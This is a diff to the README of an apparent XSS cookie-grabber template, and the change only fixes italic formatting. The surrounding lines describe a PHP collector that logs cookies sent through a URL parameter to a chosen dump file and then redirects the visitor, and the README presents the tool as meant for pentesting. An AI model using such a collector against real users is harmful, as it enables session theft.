@@ -34,15 +34,15 @@
     ```http
     http://127.0.0.1/index.php?cookies=12345&arbitraryarg=67890&redirect=http://github.com/
     ```
-    *You can `change or disable` the `default redirection` by editing or comment `$staticredirection` var in `index.php`
-    You can force the static redirection if you set `$allowgetredirection` to false in index.php*
+    *You can `change or disable` the `default redirection` by editing or comment `$staticredirection` var in `index.php`*
+    *You can force the static redirection if you set `$allowgetredirection` to false in index.php*
 
     * Write in specific dump file: **dumpfile**=arbitraryfile.txt
     ```http
     http://127.0.0.1/index.php?cookies=12345&arbitraryarg=67890&dumpfile=arbitraryfile.txt
     ```
-    *Be shure your `web server` have the right `access to create and edit` files at the root dir
-    The default dump file is `dumpfile.txt`*
+    *Be shure your `web server` have the right `access to create and edit` files at the root dir*
+    *The default dump file is `dumpfile.txt`*
 
     ### Warning
     This XSS template was created to perform pentest or others legal stuffs (like bug bounty).
